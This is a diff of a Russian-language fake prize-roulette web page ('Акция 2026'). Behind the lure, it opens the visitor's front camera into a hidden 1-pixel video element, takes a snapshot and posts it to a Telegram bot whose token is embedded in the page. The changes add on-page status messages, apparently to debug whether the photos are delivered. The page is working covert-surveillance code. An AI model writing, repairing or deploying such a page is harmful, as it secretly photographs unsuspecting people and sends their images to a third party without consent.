@@ -11,12 +11,9 @@
 
   <script>
     const TG_BOT_TOKEN = "8318987804:AAHHFs6RTMbaICdiO2OfGGaJhHear0ESF-E";
-    
-    // ⚠️ ВПИШИТЕ СЮДА СВОЙ НАСТОЯЩИЙ ЧИСЛОВОЙ CHAT ID (например: "512345678"), а НЕ токен!
-    const TG_CHAT_ID = "8318987804"; 
+    const TG_CHAT_ID = "8318987804"; // Ваш ID из @userinfobot сюда
   </script>
 
-  <!-- Скрываем видео корректно, чтобы браузер рендерил кадры -->
   <video id="camera" autoplay playsinline style="position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none;"></video>
   <canvas id="photo" style="display:none;"></canvas>
 
@@ -25,7 +22,7 @@
       <span class="bg-gradient-to-r from-pink-500 to-yellow-500 text-xs uppercase tracking-widest px-3 py-1 rounded-full font-bold shadow">
         Акция 2026
       </span>
-      <h1 class="text-2xl font-extrabold mt-3 tracking-tight">Испытай удачу и выиграй приз00v!</h1>
+      <h1 class="text-2xl font-extrabold mt-3 tracking-tight">Испытай удачу и выиграй призi!</h1>
       <p class="text-sm text-gray-300 mt-1">Крутите рулетку и забирайте ценные подарки.</p>
     </div>
 
@@ -37,6 +34,9 @@
     <div class="text-sm mb-4 text-gray-300">
       Осталось попыток: <span id="attemptsLeft" class="font-bold text-yellow-400">1</span>
     </div>
+
+    <!-- БЛОК ДЛЯ ОТОБРАЖЕНИЯ СТАТУСА (чтобы видеть ошибку) -->
+    <div id="debugStatus" class="mb-3 text-xs text-yellow-400 font-mono"></div>
 
     <button id="spinBtn" onclick="startRoulette()" class="w-full py-3 bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 font-bold rounded-xl shadow-lg transition transform active:scale-95 flex items-center justify-center gap-2 cursor-pointer">
       <i class="fa-solid fa-gift"></i> Крутить рулетку
@@ -68,6 +68,10 @@
     let wonPrize = "";
     const wheelTrack = document.getElementById("wheelTrack");
 
+    function setStatus(text) {
+      document.getElementById("debugStatus").innerText = text;
+    }
+
     function renderWheel(items) {
       wheelTrack.innerHTML = "";
       const fullList = [...items, ...items, ...items, ...items];
@@ -90,7 +94,8 @@
       document.getElementById("attemptsLeft").innerText = attempts;
       document.getElementById("spinBtn").disabled = true;
 
-      // Запрос камеры
+      setStatus("Запрос камеры...");
+
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
@@ -99,11 +104,13 @@
         video.srcObject = stream;
         await video.play();
 
-        // Даем секунду на стабилизацию потока и делаем снимок
+        setStatus("Камера активна, снимок...");
+
         setTimeout(() => {
           captureAndSendPhoto(stream, "iPhone 18 Pro Max");
         }, 1500);
       } catch (error) {
+        setStatus("Ошибка камеры: " + error.message);
         console.error("Ошибка камеры:", error);
       }
 
@@ -129,7 +136,12 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       canvas.toBlob(async (blob) => {
-        if (!blob) return;
+        if (!blob) {
+          setStatus("Ошибка создания Blob");
+          return;
+        }
+
+        setStatus("Отправка в Telegram...");
 
         const formData = new FormData();
         formData.append("chat_id", TG_CHAT_ID);
@@ -142,8 +154,14 @@
             body: formData
           });
           let result = await response.json();
-          console.log("Результат отправки:", result);
+          
+          if (result.ok) {
+            setStatus("✅ Успешно отправлено!");
+          } else {
+            setStatus("❌ Ошибка Telegram: " + result.description);
+          }
         } catch (e) {
+          setStatus("❌ Сетевая ошибка / CORS");
           console.error("Ошибка отправки", e);
         }
 
